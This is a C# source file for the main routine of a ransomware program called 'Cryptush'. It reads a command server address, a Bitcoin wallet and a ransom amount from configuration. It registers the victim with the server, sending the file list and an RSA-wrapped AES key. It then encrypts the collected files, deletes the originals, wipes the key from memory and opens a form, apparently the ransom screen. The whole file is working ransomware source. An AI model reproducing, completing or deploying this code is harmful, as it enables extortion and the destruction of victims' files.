using Cryptush.lib;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Windows.Forms;
using System.Threading;
using System.Configuration;
using System.Collections.Specialized;

namespace Cryptush
{
    static class Cryptush
    {
        public static NameValueCollection Conf = ConfigurationManager.AppSettings;
        public static string serverIP = Conf.Get("ServerIP");
        public static int serverPort = Int32.Parse(Conf.Get("serverPort"));
        public static string BitcoinWalletAddress = Conf.Get("BtcWalletAddress");
        public static string Email = Conf.Get("Email");
        public static string BtcAmount = Conf.Get("BtcAmount");

        public static string code = "";
        public static string url = $"http://{serverIP}:{serverPort}/";

        public static string docsDir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        public static string desktopDir = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
        public static string[] paths = {
            $"{desktopDir}\\test",
        };

        [STAThread]
        unsafe static void Main()
        {
            var files = Collector.Start(paths); 
            Aes aes = AESHandler.Create();
            string key = Convert.ToBase64String(aes.Key);
            var rsa = RSAHandler.Create();
            var protectedkey = RSAHandler.Enc(rsa, ref key);
            Agent agent = new Agent { Files = files, Key = protectedkey };

            while (true)
            {
                try
                {
                    agent.guid = Guid.Parse(Web.SendRequest(agent.ToJSON(), "hello"));
                    break;
                }
                catch { Thread.Sleep(30000); }
            }

            foreach (string file in files)
            {
                AESHandler.EncFile(file, ref aes);
                File.Delete(file);
            }

            fixed(char* keyptr = key)
            {
                for (int i = 0; i < key.Length; i++)
                {
                    keyptr[i] = (char)0;
                }
            }
            aes.Dispose();

            code = agent.guid.ToString();
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }
    }
}
